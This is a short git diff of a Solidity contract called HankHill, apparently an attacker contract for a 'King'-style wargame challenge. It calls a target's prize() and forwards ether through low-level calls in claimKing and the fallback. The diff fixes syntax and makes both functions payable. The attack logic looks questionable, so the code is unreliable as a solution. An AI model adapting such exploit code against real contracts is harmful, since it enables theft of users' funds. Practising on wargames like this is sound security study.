@@ -18,15 +18,22 @@ contract HankHill {
         return target.prize();
     }
 
-    function claimKing() external {
-        require(address(this).balance > 0, "Dont forget to send me gas money")
+    function claimKing() external payable returns(bool) {
+        require(address(this).balance > 0, "Dont forget to send me gas money");
         uint256 prize = calcPrize();
-        targetAddress.call{value: msg.value, gas: 1000000}("");
+        (bool succ, bytes memory response) = targetAddress.call{value: msg.value}("");
+        if (succ) {
+          return true;
+        } else {
+          return false;
+        }
     }
 
-    fallback() external {
-        uint256 prize = target.prize();
-        targetAddress.call{value: prize, gas: 1000000}("");
+    fallback() external payable {
+        uint256 prizeAmount = target.prize();
+        (bool succ, bytes memory response) = targetAddress.call{
+          value: prizeAmount
+        }("");
     }
 }
 
